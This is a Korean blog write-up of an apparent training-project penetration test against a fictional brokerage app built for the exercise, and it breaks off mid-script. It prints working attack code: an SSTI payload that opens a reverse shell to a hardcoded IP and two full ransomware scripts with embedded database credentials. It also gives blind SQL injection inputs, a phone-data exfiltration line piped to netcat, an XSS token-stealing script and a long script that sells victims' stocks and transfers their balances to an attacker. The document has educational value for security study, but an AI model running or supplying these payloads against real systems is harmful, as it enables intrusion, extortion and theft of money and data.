---
layout: single
title: "[Rookies PJT] 루키증권 시나리오 모의해킹"
categories: Security
toc: true
author_profile: false
sidebar:
  nav: "docs"
---

### 루키증권 앱 제작후 시나리오 모의해킹 진행하기.
- 루키증권은 시나리오 모의해킹을 진행하기위해 만든 가상의 증권사 이다.

# 수행 개요
## 수행 목적
- 모의해킹의 목적은 증권 서비스를 하는 루키증권을 앱 대상 블랙박스 모의해킹을 실시하여 효과적인 개선방안을 마련함으로써 정보 시스템들의 보안성과 안전성을 확보하는 데 있다. 이를 위하여 최고의 보안 기술자들로 구성된 모의해킹 전담반에 의한 모의해킹을 수행하여 보안점

## 수행 일정
- 총 7주 동안 인프라 분석, 앱 기능 분석, 취약점 진단, 모의해킹 수행, 보고서 산출 순으로 진행한다.

# 수행 방안
## 점검 도구

- 프록시 : BurpSuite, Frida
- 네트워크 : Nmap, SSH, Netcat
- 악성 앱 : Metasploit Frame work, Apktool

## 취약점 식별

| NO | 점검 항목 | 취약점 내용 | 위험도 |
|---|-------------------|-------|-------|
| 1 | 거래정보 재사용 | 거래정보 갱신이 미흡하여 하나의 거래정보로도 여러 번 거래가 가능한 취약점이 발견됨 | 상 |
| 2 | 프로그램 무결성 검증 | 프로그램을 변조하여 다른 기능들을 사용하거나 악성 앱을 넣어 배포가 가능한 취약점이 발견됨 | 상 |
| 3 | 소스코드 난독화 적용 여부 | 디컴파일(DeCompile) 기술을 이용하여 복구된 소스코드가 읽기 쉽게 되어있어 프로그램 흐름 파악, 중요 정보 획득 등의 악성 행위에 취약할 우려가 있음 | 중 |
| 4 | SQL Injection | 입력 값 검증 미흡으로 인해 사용자가 간섭 가능한 매개변수(URL 파라미터, XML 등)에 의해 SQL 질의문이 완성되어 DB 정보를 추출할 수 있음 | 상 |
| 5 | 파일 업로드 취약점 | 확장자에 대한 검증이 미흡하여 악성 파일이 서버에 업로드 됨 | 상 |
| 6 | 유추 가능한 인증정보 이용 | 회원가입 과정의 인증정보 입력 시 낮은 복잡도 및 취약한 문구 입력이 가능하여 예측 가능한 인증정보를 사용할 수 있어 취약점이 존재함 | 상 |
| 7 | 자동화 공격 | 서버 요청을 여러 번 보낼 때 세션에 대한 검증을 하지 않아 여러 번 보내지는 걸 자동화 도구를 사용하여 시스템의 글쓰기 기능을 이용해 시스템의 자원을 극도로 소모시키는 취약점 존재함 | 상 |
| 8 | 크로스사이트 요청 변조 | 애플리케이션은 각 요청에 고유한 CSRF 토큰을 포함시키는 요청의 유효성을 검증을 하지 않아 다른 서비스에서 유저의 요청을 요구하는 취약점이 발견됨 | 중 |
| 9 | 세션정보 재사용 | 사용자의 세션을 조작하여 다른 사용자로 로그인이 되는 취약점이 발견됨 | 중 |
| 10 | 크로스사이트 스크립팅 | 입력 값에 대한 검증이 미흡하여 악성 스크립트 구문 삽입 및 실행이 가능함 | 중 |
| 11 | 서버 사이드 템플릿 인젝션 | 서버의 템플릿 엔진이 입력값을 적절하게 처리하지 않아 공격자가 서버 측의 템플릿을 조작하여 서버에게 명령을 할 수 있는 취약점이 발견됨 | 상 |


# 결과 요약
## 총평
- 루키증권의 침투 테스트를 수행한 결과, 전반적으로 루키증권의 보안 인프라는 기본적인 보안 요구사항을 충족하고 있습니다. 그러나 개인정보가 포함된 마이페이지 및 공지사항, 커뮤니티 페이지에서 서버 측 템플릿 삽입(SSTI), 크로스 사이트 요청 위조(CSRF), 그리고 SQL 인젝션과 같은 심각한 취약점이 발견되었습니다. 이 보고서는 해당 취약점들로 인해 발생할 수 있는 피해와 그 영향을 상세히 설명합니다. 본 보고서의 발견 사항을 토대로 루키증권의 보안 수준을 강화한다면 안정적인 서비스를 제공할 수 있습니다.

## 모의해킹 시나리오

| NO | 시나리오 제목 | 시나리오 세부 사항 | 수행 방법 |
|---|-------------------|-------|-------|
| 1 | 시스템 침투 랜섬웨어 감염 시나리오 | SSTI 취약점을 이용하여 서버 내부로 리버스쉘 접속하는 코드를 주입해서 대상 서버의 정보를 얻은 후 랜섬웨어 코드를 이용해 데이터를 암호화 시도 | １. SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입 <br> 2. 리버스 커넥션 후 랜섬웨어 코드를 업로드 <br> 3. 랜섬웨어 코드를 통해 db백업하여 저장 후 대상 서버 db 삭제, 서버 중요 정보 암호화 |
| 2 | 코인채굴 시나리오 | Log4j 취약점을 이용하여 Shell 권한을 얻은 ec2에서 엑세스키 탈취한 후 aws cli를 통해 키와 서버를 생성한 후 생성한 서버의 자원을 통해 비트코인 채굴 시도 | 1. log4j 취약점을 이용하여 shell 권한을 얻은 ec2에서 엑세스키 탈취 후 aws cli를 통해 키, ec2 생성 <br> 2. 생성한 ec2에 접속해 비트코인 채굴 돌리는 코드 실행해서 생성된 ec2 자원을 통해 비트코인 채굴 시도 |
| 3 | 금전 취득 시나리오 | CSRF 취약점을 이용해 관리자의 jwt token 탈취 후 관리자만 접근 가능한 공지사항 페이지에 보유 주식 판매 후 강제로 송금이 되게 하는 코드를 기입한 글을 업로드하여 글을 확인한 사용자의 금전 취득 시도 | 1. Q&A 페이지에 JWT Token을 탈취할 수 있는 코드 작성 후 글 게시 <br> 2. 관리자의 JWT Token을 탈취하여 공지사항 페이지에 보유 주식 판매 및 강제 송금이 되는 코드 작성 후 글 게시해 사용자 금전 취득 시도 |
| 4 | 악성 앱 배포를 통한 모바일 탈취 시나리오 | 검색 기능에서 Blind SQL Injection을 통해 관리자의 로그인 정보를 탈취한 후 암호화된 password를 복호화해서 admin 계정 탈취 후 공지사항 페이지에 악성 앱을 배포 해 모바일 장악 시도 | 1. SQL Injection으로 관리자의 로그인 정보 탈취 <br> 2. 레인보우 테이블을 이용한 패스워드 크래킹 <br> 3. 악성 앱 다운로드 유도하는 공지사항 작성 <br> 4. 사용자의 중요 정보 장악 시도 |

# 수행 결과

## S-1 시스템 침투 랜섬웨어 감염 시나리오

### 특정 페이지에서 SSTI 취약점 유무를 확인
- 검색창에 T(java.lang.Runtime).getRuntime().exec(”id")를 입력해서 Thymleaf 구 버전에서 발생하는 SSTI 취약점이 존재함을 확인한다.

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7625f76d-142d-44e0-8248-2350447edada">

### SSTI 취약점을 이용해 리버스 쉘 접속 코드를 주입
- 취약점이 존재하는 부분, 즉 커뮤니티 검색창에 리버스 쉘을 작성하는 코드를 작성하여 서버에서 실행시킨다.

```
T(java.lang.Runtime).getRuntime().exec(new String[] {"sh", "-c","echo '#!/bin/bash\nattacker_ip=51.21.82.80\nattacker_port=8888\n/bin/bash -c /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 ' > ReverseShell.sh && chmod a+x ReverseShell.sh && ./ReverseShell.sh"})
```

### 리버스 쉘을 통해 원격으로 접속 후 대상 서버의 정보 수집
- 공격자는 Nc –lnvp 8888 명령어로 netcat을 이용해 8888 포트를 리스닝한다.
> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/f7515dd2-ff39-40fd-bdf4-4ca4f219f2be">

- 리버스 쉘을 통해 원격으로 대상 서버에 접속하여 정보를 수집한다. 그 후, 서버 정보와 DB연결 정보를 확인한다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/4630c94f-3092-4d68-af42-9bae47f969ea">

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e37bb46b-62be-4440-a5fa-81ee8bc01f13">

### 수집한 정보를 바탕으로 랜섬웨어 코드를 작성

- 수집한 서버, 데이터베이스 정보를 바탕으로 서버 정보를 암호화하고 데이터베이스를 백업해 가져온 후 서버에서 삭제하는 랜섬웨어 코드를 작성한다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/98ec2acf-bbed-49ae-b7a2-da446fdca63e">

- 다음은 공격에 사용한 DB데이터 랜섬웨어 소스코드이다.

```
#!/bin/bash

# MySQL 데이터베이스 연결 정보
DB_HOST="rds-17-hack.cggbeg5i6y5t.eu-north-1.rds.amazonaws.com"
DB_USER="root"
DB_PASS="k44g20!!"
DB_NAME="rookie"
BACKUP_DIR="$PWD/DBbackupEncrypt"  # 현재 작업 디렉토리의 하위 디렉토리 DBbackup 경로

# 암호화 키
KEY="your_secret_key"

# 데이터 암호화 함수
encrypt_data() {
    local data="$1"
    echo -n "$data" | openssl enc -aes-256-cbc -e -base64 -A -pass pass:$KEY -pbkdf2
}

# 백업 디렉토리 확인 및 생성
if [ ! -d "$BACKUP_DIR" ]; then
    echo "백업 디렉토리가 존재하지 않아 생성합니다: $BACKUP_DIR"
    mkdir -p "$BACKUP_DIR"
fi

# MySQL에 연결하여 각 테이블의 데이터를 CSV 파일로 백업 및 암호화
mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();" | while read -r table_name; do
    # 각 테이블의 CSV 파일을 미리 생성
    backup_file="$BACKUP_DIR/$table_name.csv"
    touch "$backup_file"

    # 테이블 데이터를 CSV 파일에 백업
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT * FROM $table_name" | tr -d '\0' | while read -r line; do
        echo "$line" | awk -v OFS='[king]' '{$1=$1}1' >> "$backup_file"
    done

    # CSV 파일을 읽고 암호화된 파일로 저장 (확장자 king)
    encrypted_file="$backup_file.king"
    while read -r line; do
        encrypted_line=$(encrypt_data "$line")
        echo "$encrypted_line" >> "$encrypted_file"
    done < "$backup_file"

    # 원본 CSV 파일 삭제
    rm "$backup_file"

    echo "테이블 [$table_name] 백업 및 암호화 완료: $encrypted_file"
done

echo "모든 테이블 백업 및 암호화 완료"

```

- 다음은 공격에 사용한 서버 중요정보 랜섬웨어 소스코드이다.

```
#!/bin/bash

FOLDER_PATH=$1
ENCRYPTED_FOLDER_PATH=$1
WARNING_FILE="$ENCRYPTED_FOLDER_PATH/WARNING.txt" # 경고 파일 경로

KEY="your_secret_key"

find "$FOLDER_PATH" -type d | while read DIR; do
    RELATIVE_DIR=$(realpath --relative-to="$FOLDER_PATH" "$DIR")
    mkdir -p "$ENCRYPTED_FOLDER_PATH/$RELATIVE_DIR"
done

find "$FOLDER_PATH" -type f | while read FILE; do
    FILENAME=$(basename "$FILE")
    EXTENSION="${FILENAME##*.}"
    FILENAME="${FILENAME%.*}"
    echo "[암호화] $FILENAME.$EXTENSION"

    RELATIVE_PATH=$(realpath --relative-to="$FOLDER_PATH" "$FILE")

    openssl enc -aes-256-cbc -e -in "$FILE" -out "$ENCRYPTED_FOLDER_PATH/$RELATIVE_PATH.king" -pass pass:$KEY -pbkdf2

    rm "$FILE"
done

echo "암호화가 완료되었습니다."

echo "
해당 디렉토리의 모든 파일은 암호화 되었습니다.
복호화 코드와 Key가 필요합니다.
모의해King팀으로 문의해주세요.
" > "$WARNING_FILE"
```

### 랜섬웨어 코드를 서버에 업로드 

- 일련의 명령어를 통해 netcat을 이용하여 랜섬웨어 코드를 서버에 업로드한다.

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/de1d73db-fc9b-470e-8fd2-77c23d7fae8f">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/b0770176-f650-45e5-b5c3-d935682f9abd">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/3aadb3a3-2199-4112-80e2-4287dd011264">

> <img width="496" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/4fd3ce3d-d108-4dd8-8d26-d10c4c39b070">


### 랜섬웨어 코드로 서버 정보 암호화 및 db백업 후 삭제 진행

- 랜섬웨어 코드를 실행하여 서버 정보를 암호화하고 데이터베이스를 백업한 후에, 해당 데이터를 서버에서 삭제한다.

> <img width="475" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a816d117-5651-4b15-a2ec-db156dc0f1bf">

> <img width="479" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/927332c4-afa4-43cb-bb04-cf37fc8714c6">

- 암호화된 파일 내용
> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/91be8c6e-88bd-481b-afd0-387b1a79d0eb">

### 랜섬 메시지 남김

- 랜섬웨어 공격을 통해 서버에 페이지를 생성하여 랜섬 메시지를 남긴다. 이를 통해 서버 관리자에게 요구사항을 알리고 사용자들에게 경고를 전달할 수 있다.

> <img width="255" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8ffef4ca-d9f9-4151-b502-683e41a1957f">

## S-2 코인 채굴 시나리오

### Log4j 취약점을 이용해 쉘 권한 획득

- Log4j 취약점은 Apache 로그 라이브러리에서 발견된 보안 취약점으로, 이를 이용하면 악의적인 코드를 실행할 수 있는 원격 코드 실행(RCE)이 가능하다. 공격자는 이를 이용하여 원격으로 AWS EC2 인스턴스에 접근한다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/19b5e615-bb54-4535-99ec-4c74ec0b42f4">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/3c6be73e-cccd-4945-b5f3-dfa24d09d907">

- 공격 코드 삽입

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/948d5d1c-749d-4c4d-a8fa-6121127f11ea">

### Shell 권한을 얻은 EC2에서 엑세스 키 탈취

- EC2 인스턴스에 접근하면, 시스템에서 쉘 권한을 획득합니다. 이를 통해 시스템 내에서 명령어를 실행하고, AWS Command Line Interface(AWS CLI)를 사용하여 AWS 계정에 대한 액세스 키를 탈취한다.

<img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/075c08d3-4073-43e5-988b-b59ae990427b">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/db57f153-a607-4a54-98fa-9036b15b0986">

### AWS CLI를 통해 키 탈취

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/edeef47e-bbc5-4a5b-b46b-91bbc6533cd9">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/16f87ef8-b04d-4295-98a2-b0f38aaaaad7">

### AWS CLI를 통해 EC2 생성

- 획득한 액세스 키를 사용하여 AWS CLI를 실행하여 새로운 EC2 인스턴스를 생성한다. 생성된 인스턴스에 원격으로 접속하여 제어할 수 있는 환경을 구축한다. 이를 통해 AWS 인프라 내에서 자유롭게 활동할 수 있다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e5162460-b07d-4052-952d-cdb84ece84e9">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/ff6e8ce8-46cd-4ec8-b5da-8ad407e9de79">

### 생성한 EC2에 접속

- 생성한 EC2에 접속한다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/adbd2bf0-8ac7-47ed-a939-7d5b835f0301">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/1e93e42e-cd66-4f53-8b38-e2cc549c650d">

### 비트코인 채굴 코드 준비

- EC2 인스턴스에 접속한 후 비트코인 채굴을 위한 코드를 인스톨 한다. 이 코드는 EC2 인스턴스의 리소스를 사용하여 비트코인을 채굴하기 위한 것이다.

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/9a5aaf3e-0c3f-47bd-821b-85eb466e4f9a">

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/9b67fb8d-e998-4618-b8f0-fd532e735eec">

- 채굴 진행

> <img width="454" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/3d3cef79-a7c2-4b03-9996-5a774b096c81">


## 악성 앱 배포를 통한 모바일 탈취 시나리오

- 악성 앱 배포를 통한 모바일 탈취 시나리오는 SQL Injection 취약점을 활용한 시나리오이다. SQL Injection 취약점은 악의적인 SQL 코드가 실행되게 함으로써 데이터베이스 시스템을 조작하는 보안 취약점이다. 이 취약점을 통해 공격자는 데이터베이스에서 데이터를 조회, 삭제, 수정할 수 있으며 궁극적으로는 전체 시스템에 대한 제어권을 획득할 수도 있다.

### 1차 정보 수집

- 루키증권 웹사이트의 종목 검색 기능에서 SQL Injection 취약점을 확인한다. 참인 쿼리를 넣었을 때는 검색 결과가 정상적으로 나오는 것을 확인할 수 있다.

| 입력 구문 (참) |
|---------|
| a%’ and 1=1 and ‘%1%’=’%1 |

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/b35f7613-1fa5-4cf9-85ec-061d500c4e9b">

<br>
<br>

- 거짓인 쿼리를 넣었을 때는 검색 결과가 없는 것을 보아 Blind SQL Injection에 취약한 것을 알 수 있다.

| 입력 구문 (거짓) |
|---------|
| a%’ and 1=1 and ‘%1%’=’%2 |

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/69634c34-5f65-46ca-9bc1-bdaa0d58445e">

### DB 내 정보 탈취

- 루키증권 웹사이트의 종목 검색 기능에 Blind SQL Injection 자동화 스크립트를 적용하여 DB 내 테이블 정보를 탈취하고 Users 테이블에 대한 컬럼을 탈취한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/fdffdf3e-6503-4a60-90e1-9ea723c43d18">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a3dd14d1-b71d-499d-9fae-212964515af6">

- 그리고 테이블 내 전체 데이터를 탈취한다. 그 결과 ACCESS_LEVEL 값이 1인 관리자(admin) 계정이 존재한다는 것을 확인할 수 있다. 그리고 탈취한 전체 데이터를 엑셀 파일로 저장한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/66ae5889-2ff3-4503-8bda-86ace0e5ad74">

- 여기서 USER_ID와 USER_PW를 추출해서 패스워드 파일 형태로 저장한다.

> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/cbd53303-5199-45d5-97b2-82395d94d581">


### 관리자 계정 접근

- 탈취한 데이터 중 비밀번호는 SHA256으로 단방향 암호화되어 있으므로, 레인보우 테이블을 기반으로 한 패스워드 크래킹을 진행하여 비밀번호를 복호화 한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e406f6c3-7928-4817-a794-507f2cbcab7f">

- SHA256 형식을 지정하고 패스워드 크래킹을 진행한 결과 관리자 계정의 비밀번호가 admin임을 확인할 수 있다. 크래킹 된 패스워드를 파일로 저장한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/4edecef3-333d-4530-978f-99e976f8179d">

- 패스워드 크래킹 결과로 관리자 계정 ID 와 패스워드를 알아냈다. 이걸 이용하여 관리자 계정으로 로그인을 한다.

### 악성 공지사항 작성

- 관리자 계정을 이용하여 악성 앱 다운로드를 유도하는 공지사항을 작성한다. 공지사항 작성 페이지에서 프록시 도구를 활용하여 파일 확장자를 검사하는 자바스크립트 코드를 변조한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/066f8e0a-4e9e-4afd-82bf-56dba78ec177">

- 화이트박스 기반 필터링 리스트에 apk 확장자를 추가하여 확장자 필터링을 우회한다.

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/f77733bd-4c39-4d81-8f8c-9784cc1ed712">

- 그리고 악성 앱과 함께 공지사항 글을 작성하여 게시해서 사용자들이 링크된 악성 앱을 다운로드하게 한다.

### 중요 정보 탈취

- 사용자가 공지사항에서 악성 앱을 다운로드 받아 설치한다.

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/6f006475-df3c-4d59-b51b-b25a401928b5">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/1fe75373-65f7-4545-8242-90409e4b8018">

- 공격자의 컴퓨터에 접속해서 8888포트를 열고 사용자가 악성 앱을 다운로드하고 실행해서 리버스 쉘이 연결되기를 기다린다.

| 입력 구문 |
|---------|
| netcat-win32-1.12>nc64.exe -nvlp 8888 |

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7f2d8d98-725c-47c6-b1e8-a181a7588b02">


- 사용자가 앱을 실행하면 공격자 서버와 연결이 되면서 휴대폰의 쉘을 획득할 수 있다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7176ceea-f08f-4a6d-bd1c-d2b944111ea7">

- 피해자 휴대폰의 내장 메모리에 접근한 뒤 탈취하고 싶은 데이터가 있는 위치로 이동한다.

| 입력 구문 |
|---------|
| cd /storage/emulated/O/DCIM |

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/723d2566-2245-4d07-ac0a-9c09898bef54">

- 공격자의 또 다른 포트를 열어두고 사용자의 휴대폰에서 공격자의 서버로 데이터를 전송한다.

| 입력 구문 |
|---------|
| tar cfp – Camera | nc 192.168.14.180 5555 |

> <img width="477" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a481990b-5e31-4544-a7af-9a843e2ea9aa">

- 사용자의 휴대폰 카메라에 접근했을 때 이미지 파일들을 전부 확인할 수 있다. 이 외에도 사용자의 개인정보나 중요 정보를 획득할 수 있다.

> <img width="478" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/64c8d468-caa6-449f-b4e6-599f698036f2">


## S-4 금전 취득 시나리오

- 금전 취득 시나리오는 XSS 취약점, E2E 우회, CSRF 취약점을 활용한 공격 시나리오이다. 크로스 사이트 스크립팅 취약점은 악의적인 스크립트가 웹 애플리케이션을 통해 다른 사용자의 브라우저로 전송되어 실행되는 보안 취약점이다. 이 취약점을 통해 공격자는 사용자의 세션을 탈취하거나, 웹사이트를 변조하거나, 사용자를 속여 정보를 빼내는 등의 행위를 할 수 있다. E2E 우회는 암호화된 통신 경로에서, 종단 간 보안이 제대로 구현되지 않아 발생하는 보안 취약점을 의미한다. 이를 통해 공격자는 데이터의 암호화를 우회하여 중간에서 데이터를 읽거나 변조할 수 있다. 크로스 사이트 요청 변조 취약점은 공격자가 사용자의 브라우저를 이용하여 사용자의 의도와는 무관하게 웹 애플리케이션의 악의적인 요청을 보내도록 만드는 보안 취약점이다. 이 과정에서 사용자는 자신이 로그인한 웹사이트에서 의도치 않은 행동을 실행하게 된다.

### 1차 정보 수집

- 루키증권 문의 게시판에 자바스크립트 코드가 포함된 글을 작성하고, 이 코드가 게시글을 조회하는 사용자의 브라우저에서 실행되는지 확인한다.

| 입력 구문 |
|---------|
| <script>alert(‘test’);</script> |

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8d473a6c-03bf-4fa5-8445-cc601bde1c49">
> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e6d8147d-bedc-45fe-8aa4-1c1dee666fef">

### 관리자 인증 정보 탈취
- 크로스 사이트 스크립팅 취약점을 이용해서 문의 게시판에 JWT Token을 획득할 수 있는 스크립트를 작성한다. 획득한 관리자의 JWT Token을 이용하여 관리자 계정으로 로그인을 한다.

| 입력 구문 |
|---------|
| <script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script> |

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8bd89b09-b393-4bda-b2ca-e0419c48f3b3">

- 관리자가 문의게시판에서 문의 글 확인 시 관리자의 JWT Token을 탈취하여 해커서버로 전송 한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/50bfbfb3-aeed-40e2-995f-5d7ef2b9f27d">
> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/46c37686-1132-4329-95a4-2225f6179128">
> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a71e1536-9f6e-4720-afd1-c8a6b379a3fa">
> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e607b7cc-27e1-4a4a-a452-2ff336ddda86">
> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/40d310f1-ae2b-4964-868e-248cb2a4bd17">

- 탈취한 관리자 계정을 이용하여 문의게시판에 접근한다.

### 2차 정보 수집

- 공지사항 게시판에서 CSRF 취약점이 있는 것을 확인한다. 공지사항 페이지에서 공지사항 글쓰기 폼을 가져와서 글 내용에 포함시켜서 글을 작성해 보면 글쓰기 폼이 작성되는 것을 확인할 수 있다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/abd4367e-bb3a-41be-992d-6ed0fe6f1100">

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/f226fc77-928f-4715-bdb4-62ef01a67b41">

- 마이페이지에서 송금할 때를 Burp로 잡아서 E2E 암호화에 RSA 키가 필요한 것을 확인한다.

> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/78dc3150-3af6-4a52-9c04-479e054888cb">

- 이를 바탕으로 글을 확인한 사용자의 RSA 키와 보유 주식 수, 계좌 잔액을 가져오는 스크립트 작성한다.

### E2E 우회

- 글을 확인한 사용자의 RSA 키와 보유 주식 수까지 확인할 수 있는 스크립트와 계좌 잔액을 확인할 수 있는 스크립트를 작성하면 확인이 가능하다.

> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7b189253-4adb-477e-b765-bedf6482f418">

### 최종 공격 수행

- 공지사항을 통해 공지사항 글을 확인한 모든 사용자의 보유 주식을 판매하고 계좌의 잔액을 전부 해커에게 송금하는 스크립트를 작성한 후 공지사항을 게시한다.


```
<script src="/js/jquery.min.js"></script>
<script src="/js/rsa/jsbn.js"></script>
<script src="/js/rsa/prng4.js"></script>
<script src="/js/rsa/rng.js"></script>
<script src="/js/rsa/rsa.js"></script>
 
<script>
    async function getStock() {
        const stockCode_list = ['AAPL', 'AMZN', 'FB', 'GOOGL', 'MSFT'];
        const stockName_list = ['Apple', 'Amazon.com', 'Meta', 'Alphabet', 'Microsoft'];
 
        for (let i = 0; i < stockCode_list.length; i++) {
            const stockCode = stockCode_list[i];
            const stockName = stockName_list[i];
            try {
                const response = await fetch(`https://www.rookiestock.com/detailstock?stockCode=${stockCode}&stockName=${stockName}`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });
 
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
 
                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");
                const userIdInput = doc.querySelector("#USER_ID");
                const modulusMatch = html.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = html.match(/id="RSAExponent"\s+value="([^"]+)"/);
                const match = html.match(/own\.innerHTML \+= "[^`]*`(\d+)`/);
                let haveUnit = "";
                if (match) {
                    haveUnit = match[1]; 
                    console.log('보유 주식 수:', haveUnit);
                } else {
                    console.log('매치되는 데이터가 없습니다.');
                }
                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1];
                    const userIdValue = userIdInput.value;
                    console.log('Extracted RSAModulus:', RSAModulus);
                    console.log('Extracted RSAExponent:', RSAExponent);
                    console.log('Extracted USER_ID:', userIdValue);
                    await performAjaxSell(RSAModulus, RSAExponent, userIdValue, stockCode, haveUnit);
                } else {
                    console.log('USER_ID input not found in the data.');
                }
            } catch (error) {
                console.error('Fetch error:', error);
            }
        }
    }
 
    async function sendMoney() {
        try {
            const response = await fetch('https://www.rookiestock.com/mypage', {
                method: 'GET',
                headers: {
                    'Accept': 'text/plain'
                }
            });
 
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
 
            const res = await response.text();
            const balanceRegex = /"ACCOUNT_BALANCE":(\d+)/;
            const match = res.match(balanceRegex);
 
            if (match) {
                var bal = match[1]; 
                console.log("ACCOUNT_BALANCE value:", bal);
 
                const transfer_res = await fetch('https://www.rookiestock.com/mypage/transfer', {
                    method: 'GET',
                    headers: {
                        'Accept': 'text/plain'
                    }
                });
 
                if (!transfer_res.ok) {
                    throw new Error('Network response was not ok');
                }
 
                const tranfer_text = await transfer_res.text();
                const userIdInput = 'hacker'; 
                const modulusMatch = tranfer_text.match(/id="RSAModulus"\s+value="([^"]+)"/);
                const Exponent = tranfer_text.match(/id="RSAExponent"\s+value="([^"]+)"/);
 
                if (userIdInput && modulusMatch && Exponent) {
                    const RSAModulus = modulusMatch[1];
                    const RSAExponent = Exponent[1]; 
                    await ajaxSend(RSAModulus, RSAExponent, userIdInput, bal);
                } else {
                    console.log("Required data not found in transfer response.");
                }
            } else {
                console.log("ACCOUNT_BALANCE not found.");
            }
        } catch (error) {
            console.error('Fetch error:', error);
        }
    }
 
    async function main() {
        await getStock();
        await sendMoney();
    }
 
    main();
 
    async function performAjaxSell(RSAModulus, RSAExponent, UserId, stock, haveUnit) {
    var PRICE = '100';
    var UNIT = haveUnit;
    var USERID = UserId;
    var STOCK = stock;
 
    const rsa = new RSAKey();
    rsa.setPublic(RSAModulus, RSAExponent);
    let data = {
        stock: STOCK,
        price: PRICE,
        userId: USERID,
        unit: UNIT
    };
    let e2eData = rsa.encrypt(JSON.stringify(data));
 
